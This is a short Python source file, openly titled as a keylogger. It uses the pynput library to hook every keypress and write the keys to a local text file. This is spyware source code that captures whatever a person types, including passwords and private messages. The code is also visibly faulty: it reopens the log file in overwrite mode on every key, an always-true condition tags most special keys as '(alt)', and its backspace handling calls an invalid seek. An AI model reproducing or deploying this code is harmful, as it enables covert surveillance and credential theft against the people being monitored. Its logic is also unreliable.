"""
Python Keylogger
By Connor Jackson
"""
from pynput import keyboard

output_file = "record.txt"


def on_press(key):
    file1 = open(output_file, 'w')
    try:
        print(key)
        file1.write(key.char)
        file1.close()
    except AttributeError:
        print(key)
        if key == keyboard.Key.enter:
            file1.write('\n')
        elif key == '.':
            file1.write('.\n')
        elif key == keyboard.Key.space:
            file1.write(' ')
        elif key == keyboard.Key.backspace:
            try:
                file1.seek(-1)
                file1.truncate()
            except ValueError:
                # This happens if the first key pressed is backspace (on an empty file)
                pass
        elif key == keyboard.Key.alt or keyboard.Key.alt_gr or keyboard.Key.alt_l or keyboard.Key.alt_r:
            file1.write(' (alt) ')
        if key == keyboard.Key.esc:
            file1.write(' (esc) ')
        elif key == keyboard.Key.scroll_lock:
            # End key for debug purposes
            file1.close()
            return False
    finally:
        file1.close()


def on_release(key):
    pass


def listen():
    # global file1
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    listen()
